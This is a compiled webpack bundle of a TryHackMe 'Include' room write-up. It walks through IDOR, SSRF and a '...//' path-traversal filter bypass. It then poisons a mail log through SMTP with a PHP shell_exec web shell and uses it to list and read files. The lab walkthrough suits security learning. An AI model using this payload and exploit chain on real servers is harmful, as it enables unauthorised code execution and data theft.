"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[7607],{79599:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>r,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>c,toc:()=>d});var t=s(74848),i=s(28453);const a={},o="Include",c={id:"writeups/thm/include/index",title:"Include",description:"A writeup for the room Include on TryHackMe.",source:"@site/docs/writeups/thm/include/index.md",sourceDirName:"writeups/thm/include",slug:"/writeups/thm/include/",permalink:"/docs/writeups/thm/include/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/include/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Hijack",permalink:"/docs/writeups/thm/hijack/"},next:{title:"Mother",permalink:"/docs/writeups/thm/mother/"}},r={},d=[{value:"What is the flag value after logging in to the SysMon app?",id:"what-is-the-flag-value-after-logging-in-to-the-sysmon-app",level:3},{value:"What is the content of the hidden text file in /var/www/html?",id:"what-is-the-content-of-the-hidden-text-file-in-varwwwhtml",level:3}];function l(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h3:"h3",p:"p",pre:"pre",...(0,i.R)(),...e.components},{Image:a}=n;return a||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"include",children:"Include"}),"\n",(0,t.jsxs)(n.p,{children:["A writeup for the room ",(0,t.jsx)(n.a,{href:"https://tryhackme.com/room/include",children:"Include"})," on TryHackMe."]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"Use your server exploitation skills to take control of a web app."}),"\n"]}),"\n",(0,t.jsx)(a,{src:s(78283).A,height:"256"}),"\n",(0,t.jsx)(n.h3,{id:"what-is-the-flag-value-after-logging-in-to-the-sysmon-app",children:"What is the flag value after logging in to the SysMon app?"}),"\n",(0,t.jsx)(n.p,{children:"The first step is to scan the target with nmap:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"nmap -sS TARGET_IP\n"})}),"\n",(0,t.jsx)(a,{src:s(86022).A}),"\n",(0,t.jsx)(n.p,{children:"The services on port 4000 and 50000 could be interesting:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"nmap -A -p 4000,50000 TARGET_IP\n"})}),"\n",(0,t.jsx)(a,{src:s(43902).A}),"\n",(0,t.jsx)(a,{src:s(35558).A}),"\n",(0,t.jsx)(n.p,{children:"They are both web servers. The one on port 4000 is a login page."}),"\n",(0,t.jsx)(a,{src:s(1342).A}),"\n",(0,t.jsx)(n.p,{children:"The service on port 50000 is an admin panel."}),"\n",(0,t.jsx)(a,{src:s(89774).A}),"\n",(0,t.jsxs)(n.p,{children:["We can try to login to the website on port 4000 with guest",":guest"," as credentials."]}),"\n",(0,t.jsx)(n.p,{children:"Once inside we can see a user profile page."}),"\n",(0,t.jsx)(n.p,{children:"There are many properties and a form to add a new one."}),"\n",(0,t.jsx)(n.p,{children:"By looking to the URL we can easily see that there is an IDOR vulnerability."}),"\n",(0,t.jsx)(a,{src:s(64523).A}),"\n",(0,t.jsx)(n.p,{children:"There are two other users (2 and 3) but there is nothing to do with them."}),"\n",(0,t.jsx)(n.p,{children:"Because there is a property called isAdmin set to false, we can try to change it."}),"\n",(0,t.jsx)(a,{src:s(77171).A}),"\n",(0,t.jsx)(n.p,{children:"Once done new pages are available: API and Settings."}),"\n",(0,t.jsx)(a,{src:s(62677).A}),"\n",(0,t.jsx)(a,{src:s(5713).A}),"\n",(0,t.jsx)(n.p,{children:"The API page contains the details about two endpoints available for the user."}),"\n",(0,t.jsx)(n.p,{children:"The endpoints are not directly accessible by us."}),"\n",(0,t.jsx)(n.p,{children:"Inside the Settings page, we can see an input field to change the profile banner."}),"\n",(0,t.jsx)(n.p,{children:"If we try to change the link we will see that the server will download the image and set as url its base64 encoding."}),"\n",(0,t.jsx)(n.p,{children:"By giving one of the endpoints as a link, the server will download the content and show it to us."}),"\n",(0,t.jsx)(n.p,{children:"This vulnerability is called Server-Side Request Forgery (SSRF)."}),"\n",(0,t.jsx)(a,{src:s(243).A}),"\n",(0,t.jsx)(a,{src:s(74739).A}),"\n",(0,t.jsx)(n.p,{children:"We finally have access to the admin panel and obtain the first flag."}),"\n",(0,t.jsx)(a,{src:s(14198).A}),"\n",(0,t.jsx)(n.h3,{id:"what-is-the-content-of-the-hidden-text-file-in-varwwwhtml",children:"What is the content of the hidden text file in /var/www/html?"}),"\n",(0,t.jsx)(n.p,{children:"We can try to search for subpaths with gobuster:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://TARGET_IP:50000\n"})}),"\n",(0,t.jsx)(a,{src:s(7458).A}),"\n",(0,t.jsxs)(n.p,{children:["Looking to the source code of the admin panel we can see that the profile image is loaded as ",(0,t.jsx)(n.code,{children:"profile.php?img=profile.png"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"The image is inside the uploads folder."}),"\n",(0,t.jsx)(a,{src:s(4910).A}),"\n",(0,t.jsxs)(n.p,{children:["We can try to change the link to ",(0,t.jsx)(n.code,{children:"profile.php?img=../uploads/profile.png"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"However, the path in this way will not work."}),"\n",(0,t.jsx)(n.p,{children:"If we play a bit with the link we can see that the server is removing in some way the first part."}),"\n",(0,t.jsx)(n.p,{children:"By adding ...// multiple times we can bypass the filter and access the file."}),"\n",(0,t.jsx)(n.p,{children:"This is an example of Local File Inclusion (LFI) vulnerability."}),"\n",(0,t.jsx)(a,{src:s(27391).A}),"\n",(0,t.jsx)(n.p,{children:"Looking to one of the available PHP file it is possible to notice that they are parsed by the server."}),"\n",(0,t.jsx)(n.p,{children:"This means that if we can insert PHP code into a file, it can be executed, causing an RCE (Remote Code Execution)."}),"\n",(0,t.jsx)(n.p,{children:"A possible way is through log poisoning using for example the /var/mail/log file."}),"\n",(0,t.jsx)(n.p,{children:"To insert something into this log file it is enough to send an email through the SMTP server."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"telnet TARGET_IP 25\nhelo test\nmail from: <?php echo shell_exec($_GET['cmd']); ?>\n"})}),"\n",(0,t.jsx)(a,{src:s(89552).A}),"\n",(0,t.jsxs)(n.p,{children:["Now, by sending ",(0,t.jsx)(n.code,{children:"&cmd=ls"})," as a parameter inside the final log file it will be possible to see the output of the command."]}),"\n",(0,t.jsx)(n.p,{children:"To find the hidden file we can use the following command:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"&cmd=ls%20-a%20/var/www/html\n"})}),"\n",(0,t.jsx)(a,{src:s(8442).A}),"\n",(0,t.jsx)(n.p,{children:"Finally, we can read the content of the hidden file obtaining the second flag."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"&cmd=cat%20/var/www/html/REDACTED\n"})}),"\n",(0,t.jsx)(a,{src:s(52920).A})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},86022:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-1-nmap-59871c96de19e87f6fcfa1bd8625675b.png"},243:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-10-endpoint-1-e95ab9da534e5b3da388077d541a60da.png"},74739:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-11-endpoint-2-7a1bf869cd8e804a6e3b0f9519948682.png"},14198:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-12-flag-f21dc89f012c1ae300dfe88ef148f2ef.png"},43902:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-2-nmap-4000-18f2094a4c739b9ba828bfaf667f8229.png"},35558:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-3-nmap-50000-a6f6085d6b1596d25e0289773ac4c284.png"},1342:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-4-4000-index-cea734d04d67ecdeb4a1a85ab4a03738.png"},89774:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-5-50000-index-39bc237451b9471e55972eed12efca3e.png"},64523:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-6-idor-15ce7eb75a6763ab894ec0c2a181156c.png"},77171:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-7-admin-00a8b8d6d9aaa6d63e76d3708439e933.png"},62677:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-8-api-d6cbffe5802afeb8d5f6e7ad71713a98.png"},5713:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-9-settings-a93145b279842c0b35d38a0dd50a20af.png"},7458:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-1-gobuster-ea8c798e42fe04a946561dd0ab448150.png"},4910:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-2-uploads-537b6dd8bd5b788eba75a2121359d02c.png"},27391:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-3-passwd-a3ec0368f190eff663c1e5148b4e835c.png"},89552:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-4-telnet-c6634696352096198022e7bd02574d71.png"},8442:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-5-files-b2c8c312b3b7c8bc9ab2903eec23ff01.png"},52920:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-6-flag-9008efbc5078ac37290fc3d8213157d9.png"},78283:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/logo-8c2016d95d612c222387f6e2b39eef69.png"},28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>c});var t=s(96540);const i={},a=t.createContext(i);function o(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);